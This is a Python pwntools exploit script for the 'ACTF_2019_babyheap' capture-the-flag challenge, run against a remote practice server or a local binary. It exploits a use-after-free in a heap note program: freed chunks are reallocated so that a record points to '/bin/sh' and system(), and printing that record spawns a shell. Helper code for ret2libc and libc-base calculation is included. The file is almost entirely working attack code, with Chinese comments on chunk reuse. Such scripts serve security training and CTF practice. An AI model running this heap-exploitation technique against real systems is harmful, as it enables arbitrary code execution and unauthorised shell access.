from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')

binary = './ACTF_2019_babyheap'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29822) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'Your choice: ',b'1')
    sla(b'Please input size: ',int2bytes(len))
    sa(b'Please input content: ',content)

def show(index):
    sla(b'Your choice: ',b'3')
    sla(b'Please input list index: ',int2bytes(index))

# def edit(index,content):
#     sla(b':',b'2')
#     sla(b':',int2bytes(index))
#     sa(b':',content)

def delete(index):
    sla(b'Your choice: ',b'2')
    sla(b'Please input list index: \n',int2bytes(index))
	#有的时候需要更精确的sendafter，不然送数据的时间不对会导致debug很久

bin_sh_addr = 0x602010
system_plt = elf.plt['system']

add(0x20,b'aaa') #0 ptr[0]->first chunk(0x10)->content chunk(size) + print_s
add(0x20,b'bbb') #1 ptr[1]->first chunk(0x10)->content chunk(size) + print_s
# add(0x10,b'c') #2
delete(0)
delete(1)
# dbg()
add(0x10,p64(bin_sh_addr)+p64(system_plt))#2 -- 其实它的记录区用的是1的记录区，内容区用的是0的记录区
# dbg()
show(0)
itr()